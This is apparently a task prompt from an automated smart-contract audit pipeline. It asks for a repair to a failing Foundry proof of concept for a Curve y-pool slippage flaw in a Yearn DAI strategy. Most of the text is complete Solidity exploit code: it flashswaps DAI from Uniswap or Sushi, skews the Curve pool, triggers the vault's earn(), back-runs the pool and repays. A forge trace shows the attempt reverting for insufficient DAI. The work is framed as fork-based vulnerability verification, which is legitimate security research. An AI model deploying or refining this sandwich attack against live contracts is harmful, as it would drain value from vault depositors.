You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Curve deposits and exits execute with zero slippage protection, enabling MEV extraction
- claim: The strategy hardcodes zero minimum outputs for every Curve interaction: `add_liquidity(..., 0)`, `remove_liquidity(..., [0,0,0,0])`, and all three `exchange(..., 0)` calls. As a result, deposits, partial withdrawals, and full migrations will accept whatever execution price exists in the Curve y-pool at that moment.
- impact: A searcher can temporarily skew the Curve pool immediately before `deposit()`, `withdraw(uint)`, or `withdrawAll()`, force the strategy to mint or unwind at a severely unfavorable rate, then back-run the pool to keep the difference. This can extract a material portion of TVL from a single large deposit, withdrawal, or migration.
- exploit_paths: ["deposit() -> add_liquidity([_y,0,0,0], 0)", "withdraw(uint) -> _withdrawSome() -> withdrawUnderlying() -> remove_liquidity(_amount, [0,0,0,0]) -> exchange(..., 0)", "withdrawAll() -> _withdrawAll() -> withdrawUnderlying() -> remove_liquidity(_amount, [0,0,0,0]) -> exchange(..., 0)"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStrategyDAICurve {
    function controller() external view returns (address);
    function balanceOf() external view returns (uint256);
}

interface IControllerLike {
    function vaults(address token) external view returns (address);
}

interface IYearnTokenLike {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
}

interface ICurveYPoolLike {
    function exchange(int128 from, int128 to, uint256 amountIn, uint256 minAmountOut) external;
}

interface IYVaultLike {
    function earn() external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xaf274e912243b19B882f02d731dacd7CD13072D0;
    address internal constant CURVE_Y_POOL = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant YDAI = 0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01;
    address internal constant YUSDC = 0xd6aD7a6750A7593E092a9B218d66C0A814a3436e;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 internal constant MIN_PROFIT = 1e15;

    address internal realizedProfitToken;
    uint256 internal realizedProfit;
    bool internal validated;
    string internal usedPath;
    string internal notes;

    address internal activePair;
    address internal activeVault;
    uint256 internal activeBorrowAmount;

    constructor() {}

    function executeOnOpportunity() external {
        _resetOutcome();

        address controller = IStrategyDAICurve(TARGET).controller();
        address vault = controller == address(0) ? address(0) : IControllerLike(controller).vaults(DAI);
        uint256 vaultIdleDai = vault == address(0) ? 0 : IERC20Like(DAI).balanceOf(vault);
        uint256 strategyMarkedValue = IStrategyDAICurve(TARGET).balanceOf();

        if (vault == address(0)) {
            notes =
                "Controller returned no live DAI vault, so the public deposit trigger vault.earn() was unreachable. "
                "withdrawAll() is controller-only, and the captured fork therefore exposes no public path into the zero-min Curve calls.";
            return;
        }

        FundingSource memory funding = _selectFundingSource();
        if (funding.pair == address(0) || funding.daiReserve == 0) {
            notes =
                "No pre-existing UniswapV2/Sushi-like DAI funding pair was available for the required flashswap-funded sandwich. "
                "The root cause still remains the strategy's zero-min Curve usage.";
            return;
        }

        if (vaultIdleDai > 0) {
            if (_tryFlashswapDepositRoute(vault, vaultIdleDai, funding)) {
                return;
            }
        }

        notes =
            "The verifier replaced the dead existing-balance branch with a deterministic DAI flashswap, but no tested deposit-side size left residual DAI above flashswap repayment at this fork block. "
            "The captured logs already showed the strategy started empty, so the exit paths withdraw(uint) and withdrawAll() had no pre-existing strategy inventory to unwind before a prior earn(), and withdrawAll() remains controller-only. "
            "Exploit causality is unchanged: public vault.earn() is still the reachable path into strategy.deposit() -> add_liquidity([_y,0,0,0], 0).";

        if (vaultIdleDai == 0) {
            notes =
                "The live DAI vault held no idle DAI at this fork block, so the public deposit trigger vault.earn() had nothing to forward into strategy.deposit() -> add_liquidity([_y,0,0,0], 0). "
                "The captured logs also showed the strategy started with zero marked assets, so the exit-side paths had no live position to unwind from this initial state.";
        } else if (strategyMarkedValue == 0) {
            notes =
                "Flashswap funding fixed the verifier's capital issue, but the captured fork still starts with an empty strategy, so only the deposit-side public trigger is live before any prior earn(). "
                "The verifier therefore kept the exploit aligned to vault.earn() -> strategy.deposit() -> add_liquidity([_y,0,0,0], 0) and did not claim the controller-only withdrawAll() path.";
        }
    }

    function runFlashVaultEarnAttempt(address vault, address pair, uint256 borrowDai) external returns (uint256 profit) {
        require(msg.sender == address(this), "self only");
        require(vault != address(0), "no vault");
        require(pair != address(0), "no pair");
        require(borrowDai > 0, "no borrow");

        uint256 daiBefore = IERC20Like(DAI).balanceOf(address(this));
        activePair = pair;
        activeVault = vault;
        activeBorrowAmount = borrowDai;

        IUniswapV2PairLike flashPair = IUniswapV2PairLike(pair);
        address token0 = flashPair.token0();
        address token1 = flashPair.token1();
        require(token0 == DAI || token1 == DAI, "pair lacks DAI");

        if (token0 == DAI) {
            flashPair.swap(borrowDai, 0, address(this), abi.encode(uint256(1)));
        } else {
            flashPair.swap(0, borrowDai, address(this), abi.encode(uint256(1)));
        }

        activePair = address(0);
        activeVault = address(0);
        activeBorrowAmount = 0;

        uint256 daiAfter = IERC20Like(DAI).balanceOf(address(this));
        require(daiAfter > daiBefore, "no profit");
        profit = daiAfter - daiBefore;
        require(profit >= MIN_PROFIT, "below threshold");
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == activePair, "unauthorized pair");
        require(sender == address(this), "unauthorized sender");
        require(data.length != 0, "missing callback");

        uint256 borrowedDai = amount0 > 0 ? amount0 : amount1;
        require(borrowedDai == activeBorrowAmount, "unexpected borrow");

        _mintYDaiFromDai(borrowedDai);

        uint256 yDaiAmount = IERC20Like(YDAI).balanceOf(address(this));
        require(yDaiAmount > 0, "no yDAI");

        _safeApprove(YDAI, CURVE_Y_POOL, yDaiAmount);

        // Requested funding strategy: source the temporary DAI from a public V2-style
        // flashswap, then keep the original exploit causality unchanged by using that
        // capital only to skew the same Curve y-pool immediately before the honest
        // public deposit path vault.earn() -> strategy.deposit() -> add_liquidity([_y,0,0,0], 0).
        ICurveYPoolLike(CURVE_Y_POOL).exchange(0, 1, yDaiAmount, 0);
        IYVaultLike(activeVault).earn();

        uint256 yUsdcAmount = IERC20Like(YUSDC).balanceOf(address(this));
        require(yUsdcAmount > 0, "no yUSDC");

        _safeApprove(YUSDC, CURVE_Y_POOL, yUsdcAmount);
        ICurveYPoolLike(CURVE_Y_POOL).exchange(1, 0, yUsdcAmount, 0);

        _withdrawAllYDai();

        uint256 repayAmount = _flashswapRepayment(borrowedDai);
        _safeTransfer(DAI, msg.sender, repayAmount);
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function hypothesisValidated() external view returns (bool) {
        return validated;
    }

    function exploitPathUsed() external view returns (string memory) {
        return usedPath;
    }

    function outcomeNotes() external view returns (string memory) {
        return notes;
    }

    function _tryFlashswapDepositRoute(
        address vault,
        uint256 vaultIdleDai,
        FundingSource memory funding
    ) internal returns (bool) {
        uint256 maxBorrow = funding.daiReserve / 3;
        if (maxBorrow == 0) {
            return false;
        }

        uint256[16] memory candidates = [
            uint256(100e18),
            250e18,
            500e18,
            1_000e18,
            2_500e18,
            5_000e18,
            10_000e18,
            20_000e18,
            40_000e18,
            80_000e18,
            vaultIdleDai / 8,
            vaultIdleDai / 4,
            vaultIdleDai / 2,
            vaultIdleDai,
            vaultIdleDai * 2,
            vaultIdleDai * 4
        ];

        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 amount = candidates[i];
            if (amount == 0 || amount > maxBorrow) {
                continue;
            }

            try this.runFlashVaultEarnAttempt(vault, funding.pair, amount) returns (uint256 profit) {
                _acceptOutcome(
                    DAI,
                    profit,
                    "flashswap(DAI) -> vault.earn() -> strategy.deposit() -> add_liquidity([_y,0,0,0], 0)",
                    "Borrowed DAI from a pre-existing UniswapV2/Sushi-like pair, converted it into yDAI, skewed the Curve y-pool with exchange(0,1,...,0), let the honest public vault.earn() route idle vault DAI through the strategy's zero-min add_liquidity([_y,0,0,0], 0), then back-ran the pool and repaid the flashswap from the extracted DAI spread."
                );
                return true;
            } catch {}
        }

        return false;
    }

    function _mintYDaiFromDai(uint256 amount) internal {
        _safeApprove(DAI, YDAI, amount);
        IYearnTokenLike(YDAI).deposit(amount);
    }

    function _withdrawAllYDai() internal {
        uint256 yDaiBalance = IERC20Like(YDAI).balanceOf(address(this));
        if (yDaiBalance > 0) {
            IYearnTokenLike(YDAI).withdraw(yDaiBalance);
        }
    }

    function _flashswapRepayment(uint256 amountBorrowed) internal pure returns (uint256) {
        return ((amountBorrowed * 1000) / 997) + 1;
    }

    function _selectFundingSource() internal view returns (FundingSource memory best) {
        FundingSource memory uni = _fundingFromFactory(UNISWAP_V2_FACTORY);
        FundingSource memory sushi = _fundingFromFactory(SUSHISWAP_FACTORY);

        best = uni;
        if (sushi.daiReserve > best.daiReserve) {
            best = sushi;
        }
    }

    function _fundingFromFactory(address factory) internal view returns (FundingSource memory funding) {
        address pair = IUniswapV2FactoryLike(factory).getPair(DAI, WETH);
        if (pair == address(0)) {
            return funding;
        }

        IUniswapV2PairLike pairLike = IUniswapV2PairLike(pair);
        (uint112 reserve0, uint112 reserve1,) = pairLike.getReserves();

        funding.pair = pair;
        if (pairLike.token0() == DAI) {
            funding.daiReserve = uint256(reserve0);
        } else if (pairLike.token1() == DAI) {
            funding.daiReserve = uint256(reserve1);
        }
    }

    function _acceptOutcome(
        address token,
        uint256 profit,
        string memory path,
        string memory detail
    ) internal {
        realizedProfitToken = token;
        realizedProfit = profit;
        validated = token != address(0) && profit >= MIN_PROFIT;
        usedPath = path;
        notes = detail;
    }

    function _resetOutcome() internal {
        realizedProfitToken = address(0);
        realizedProfit = 0;
        validated = false;
        usedPath = "";
        notes = "";
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory returndata) = token.call(data);
        require(ok, "token call failed");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "token op false");
        }
    }

    struct FundingSource {
        address pair;
        uint256 daiReserve;
    }
}

```

forge stdout (tail):
```
271d0F::balanceOf(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 145243913583557148713817 [1.452e23]
    │   │   │   │   │   ├─ [23374] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 106874018109919979745795 [1.068e23])
    │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │        topic 1: 0x00000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01
    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000016a1a6f20c27fcf5b203
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 38369895473637168968022 [3.836e22]
    │   │   │   │   │   ├─ [6496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01) [staticcall]
    │   │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::d15e0053(0000000000000000000000006b175474e89094c44da98b954eedeac495271d0f) [staticcall]
    │   │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::d15e0053(0000000000000000000000006b175474e89094c44da98b954eedeac495271d0f) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
    │   │   │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
    │   │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::c190c2ec(00000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd0100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003) [staticcall]
    │   │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::e8177dcf(0000000000000000000000006b175474e89094c44da98b954eedeac495271d0f000000000000000000000000000000000000000000000046b57a9e86f43ce965000000000000000000000000000000000000000000012b8aecc24a55e6d805ee) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   ├─ [509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   ├─ [4773] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01) [staticcall]
    │   │   │   │   │   │   ├─ [2257] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::0933c1ed(0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002470a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd0100000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [639] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transfer(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11, 130940492662420003880113 [1.309e23])
    │   │   │   │   │   └─ ← [Revert] Dai/insufficient-balance
    │   │   │   │   └─ ← [Revert] token call failed
    │   │   │   └─ ← [Revert] token call failed
    │   │   └─ ← [Revert] token call failed
    │   └─ ← [Return]
    ├─ [351] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [352] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x6B175474E89094C44Da98b954EedeAC495271d0F.transfer
  at FlawVerifier.uniswapV2Call
  at 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11.swap
  at FlawVerifier.runFlashVaultEarnAttempt
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 229.15ms (174.66ms CPU time)

Ran 1 test suite in 312.71ms (229.15ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 15630844)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
